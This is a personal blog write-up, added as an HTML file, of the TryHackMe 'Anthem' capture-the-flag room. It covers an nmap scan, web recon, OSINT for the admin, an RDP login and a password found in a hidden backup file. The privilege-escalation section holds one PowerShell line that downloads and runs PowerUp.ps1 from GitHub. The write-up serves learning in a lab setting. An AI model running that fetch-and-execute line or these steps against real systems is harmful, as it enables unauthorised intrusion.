@@ -1,0 +1,348 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>THM: Anthem</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="description" content="A beginner targeted ctf" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><link rel="stylesheet" href="/src/rougier.css" />
+    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">THM: Anthem</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org7fc5f47">Reconnaissance</a>
+<ul>
+<li><a href="#orgb735cc6">Port Scanning</a></li>
+<li><a href="#org9b6c353">Web Analysis</a>
+<ul>
+<li><a href="#org8aaa43f">Random Findings</a></li>
+<li><a href="#org6f8778c">Robots.txt, Security.txt, Sitemap.xml</a></li>
+<li><a href="#org8dfb1a3">Finding the administrator</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#org8d72fe2">Trying RDP out</a></li>
+<li><a href="#org73fb507">Privilege Escalation</a></li>
+</ul>
+</div>
+</div>
+<p>
+After a long time of not messing around with any CTFs, I decided to
+give <a href="https://tryhackme.com/room/anthem">anthem</a> a shot and see how far I could go on my own. 
+</p>
+
+<div id="outline-container-org7fc5f47" class="outline-2">
+<h2 id="org7fc5f47"><a href="#org7fc5f47">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-org7fc5f47">
+</div>
+<div id="outline-container-orgb735cc6" class="outline-3">
+<h3 id="orgb735cc6"><a href="#orgb735cc6">Port Scanning</a></h3>
+<div class="outline-text-3" id="text-orgb735cc6">
+<p>
+First things first, let&rsquo;s try to get some information about the target
+machine, checking all ports and saving the output for future use:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org1c53843">sudo nmap -sSV -p- 10.10.201.121 -oA nmap.out -T4
+</pre>
+</div>
+
+<pre class="example" id="org610cc36">
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-21 08:34 BST
+Nmap scan report for ip-10-10-201-121.eu-west-1.compute.internal (10.10.201.121)
+Host is up (0.00045s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+MAC Address: 02:20:2B:0A:0A:AD (Unknown)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 458.11 seconds
+</pre>
+
+<p>
+Checking the output we see that there are two services worth noting:
+</p>
+<ul class="org-ul">
+<li>A web server at 80</li>
+<li>An RDP server at 3389 (the protocol was not known to me, but
+googling it gives us this answer)</li>
+</ul>
+
+<p>
+Getting some more information from the web server can not hurt.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org9b6c353" class="outline-3">
+<h3 id="org9b6c353"><a href="#org9b6c353">Web Analysis</a></h3>
+<div class="outline-text-3" id="text-org9b6c353">
+<p>
+I always like to use burp suite (or zap for that matter), when I first
+start interacting with a website. It saves me the trouble of manually
+checking the HTML contents of each page (in case I want to do it), and
+also maps quite nicely the target host.
+</p>
+
+<ul class="org-ul">
+<li class="on"><code>[X]</code> Launch BurpSuite</li>
+<li class="on"><code>[X]</code> Properly set FoxyProxy to burp, allowing us to intercept the traffic</li>
+<li class="on"><code>[X]</code> Turn intercept off</li>
+<li class="on"><code>[X]</code> Visit target machine&rsquo;s website</li>
+<li class="on"><code>[X]</code> Go to Burp/Target, set the given machine as in scope, limiting
+what Burp stores, making for a relatively clutter-free environment</li>
+<li class="on"><code>[X]</code> Start moving</li>
+</ul>
+
+<div class="note" id="orgf8d8650">
+<p>
+Using <a href="https://github.com/hakluke/hakrawler">https://github.com/hakluke/hakrawler</a> while passing all the
+traffic through Burp&rsquo;s proxy might also be beneficial, but at this
+point I like manually checking every page.
+</p>
+
+</div>
+</div>
+
+<div id="outline-container-org8aaa43f" class="outline-4">
+<h4 id="org8aaa43f"><a href="#org8aaa43f">Random Findings</a></h4>
+<div class="outline-text-4" id="text-org8aaa43f">
+<p>
+While randomly clicking everywhere I could find, I got to the page of
+a writer (Jane Doe), which included a flag at a suspiciously obvious
+location. 
+</p>
+
+
+<div id="org158ae69" class="figure">
+<p><img src="Reconnaissance/20231021_105049_screenshot.png" alt="20231021_105049_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 1: </span>A flag :P</p>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org6f8778c" class="outline-4">
+<h4 id="org6f8778c"><a href="#org6f8778c">Robots.txt, Security.txt, Sitemap.xml</a></h4>
+<div class="outline-text-4" id="text-org6f8778c">
+<p>
+Visiting those files is a must when checking websites (even though the
+writer might occasionally forget about them), and <code>robots.txt</code> did not
+disappoint. Aside from giving as a direct <i>flag</i>, it showed that the
+target host uses the Umbraco CMS, and it&rsquo;s sign-in page is also revealed. 
+</p>
+
+
+<div id="org201fd27" class="figure">
+<p><img src="Reconnaissance/20231021_105217_screenshot.png" alt="20231021_105217_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 2: </span>Robots.txt contents</p>
+</div>
+
+
+<div id="org5da7431" class="figure">
+<p><img src="Reconnaissance/20231021_105556_screenshot.png" alt="20231021_105556_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 3: </span>Umbraco Sign-in Page</p>
+</div>
+
+<p>
+Sadly, however, <code>security.txt</code> and <code>sitemap.xml</code> turned out to be empty,
+lacking any information.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org8dfb1a3" class="outline-4">
+<h4 id="org8dfb1a3"><a href="#org8dfb1a3">Finding the administrator</a></h4>
+<div class="outline-text-4" id="text-org8dfb1a3">
+<p>
+At this point we have a lot of information about the target system,
+yet no information on the administrator (other than the contents of an
+article informing us of his passing), so we need to dig a little bit more.
+</p>
+
+<p>
+I got relatively stuck here, so I started searching through the pages&rsquo;
+HTML hoping that a comment might reveal their identity. (As you can
+see in the images below, after thinking of the possibility that a flag
+exists hidden there, I searched with &rsquo;thm&rsquo;, to make sure I did not
+miss anything).
+</p>
+
+
+<div id="orgfd810dc" class="figure">
+<p><img src="Reconnaissance/20231021_105932_screenshot.png" alt="20231021_105932_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 4: </span>Another random flag found during this stage</p>
+</div>
+
+
+<div id="org1f6d48b" class="figure">
+<p><img src="Reconnaissance/20231021_110055_screenshot.png" alt="20231021_110055_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 5: </span>Another random flag</p>
+</div>
+
+<p>
+After skimming through the pages and realizing that the information I
+wanted is not there, I tried the default credentials on the Umbraco
+web portal, hoping that (since its a common misconfiguration) no one
+had bothered changing them:
+</p>
+
+
+<div id="org64412af" class="figure">
+<p><img src="Reconnaissance/20231021_110556_screenshot.png" alt="20231021_110556_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 6: </span>No luck</p>
+</div>
+
+<p>
+At this point I seriously considered bruteforcing Jane Doe&rsquo;s RDP
+credentials (knowing that her email is <code>jd@anthem.com</code>). I did not,
+though, due to this statement in the problem&rsquo;s definition:
+</p>
+<blockquote>
+<p>
+In this room, you don&rsquo;t need to brute force any login page. Just your preferred browser and Remote Desktop.
+</p>
+</blockquote>
+
+<p>
+Since there were no input fields, nor parameters to check for
+injections and the website seemed like a static one, performing OSINT
+for the administrator was the only logical next step:
+</p>
+<ul class="org-ul">
+<li>I thought I had seen the article &ldquo;written for him&rdquo; somewhere, so I
+googled it, and turns out, that in its complete form, refers to
+&rsquo;Solomon Grundy&rsquo;, which (after checking with THM&rsquo;s answer), turns
+out to be the admin&rsquo;s name</li>
+<li>Their email, asked elsewhere, is easy enough to derive knowing that:
+Jane Doe translates to jd.</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org8d72fe2" class="outline-2">
+<h2 id="org8d72fe2"><a href="#org8d72fe2">Trying RDP out</a></h2>
+<div class="outline-text-2" id="text-org8d72fe2">
+<p>
+We now know the administrator&rsquo;s username, and we have a potential
+password, so checking RDP out seems like a good choice: it was.
+</p>
+
+
+<div id="org709c83e" class="figure">
+<p><img src="Trying_RDP_out/20231021_112003_screenshot.png" alt="20231021_112003_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 7: </span>Got the root flag</p>
+</div>
+
+
+<div class="note" id="org3a699ab">
+<p>
+After answering the questions on THM I realized that I had missed one,
+presumably hidden within the source code, nice 
+</p>
+
+</div>
+
+
+<div id="org071b70b" class="figure">
+<p><img src="Trying_RDP_out/20231021_112223_screenshot.png" alt="20231021_112223_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 8: </span>Completing the last web flag</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org73fb507" class="outline-2">
+<h2 id="org73fb507"><a href="#org73fb507">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-org73fb507">
+<p>
+Having limited experience with windows, I relied heavily on
+<a href="https://swisskyrepo.github.io/">PayloadsAllTheThings</a>, testing this first:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-powershell" id="org907b21a">bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); 
+</pre>
+</div>
+
+<p>
+It did not seem to work, and figuring that getting admin rights would
+be much simpler since the hint was &ldquo;it is hidden&rdquo;, I decided to
+manually check some of the most common folders I had access to:
+</p>
+<ul class="org-ul">
+<li>In Documents there was an RDP file hidden, getting my hopes up,
+before I realized that there were no parameters saved on it, meaning
+that it was useless.</li>
+<li>After checking the rest of the hard drive, I saw a hidden folder
+titled backup. Promising</li>
+</ul>
+
+<p>
+Inside <code>backup</code> there was a file called restore, which I had no
+permission to read, but seeing that I was the owner, I edited its
+properties so that I could open it properly:
+</p>
+
+
+<div id="org92f6ea0" class="figure">
+<p><img src="Privilege_Escalation/20231021_113902_screenshot.png" alt="20231021_113902_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 9: </span>Got a password-like string</p>
+</div>
+
+<blockquote>
+<p>
+Administrator:newlyFoundString
+</p>
+</blockquote>
+<p>
+Seems like a good combination to choose, so I try to view
+<code>Administrator</code>&rsquo;s home folder:
+</p>
+
+
+<div id="org8e4738c" class="figure">
+<p><img src="Privilege_Escalation/20231021_114259_screenshot.png" alt="20231021_114259_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 10: </span>Final Flag</p>
+</div>
+
+<p>
+&rsquo;twas good.
+</p>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2023-10-21 Sat 10:30 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
